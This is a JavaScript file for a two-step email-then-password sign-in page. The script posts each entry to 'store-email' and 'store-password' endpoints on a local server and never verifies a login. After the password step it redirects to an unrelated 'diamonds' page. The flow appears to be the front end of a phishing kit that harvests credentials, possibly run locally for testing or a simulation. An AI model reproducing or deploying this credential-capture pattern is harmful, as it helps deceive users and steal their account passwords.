document.addEventListener('DOMContentLoaded', function () {
    const emailInput = document.getElementById('email');
    const nextButton = document.getElementById('nextButton');

    emailInput.addEventListener('input', function () {
        if (emailInput.value.trim() !== '') {
            nextButton.disabled = false;
        } else {
            nextButton.disabled = true;
        }
    });

    nextButton.addEventListener('click', function () {
        const email = emailInput.value.trim();
        storeEmailAndRedirect(email);
    });
});

function storeEmailAndRedirect(email) {
    fetch('http://localhost:5000/store-email', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            email: email,
            password: null  // Explicitly set password to null
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            sessionStorage.setItem('userEmail', email);
            window.location.href = 'passeword.html';
        } else {
            throw new Error(data.error || 'Failed to process email');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    });
}

// Add function to store password
function storePassword(email, password) {
    fetch('http://localhost:5000/store-password', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ 
            email: email,
            password: password 
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            sessionStorage.removeItem('userEmail');
            window.location.href = '../diamonds/index.html';
        } else {
            throw new Error(data.error || 'Failed to store password');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again.');
    });
}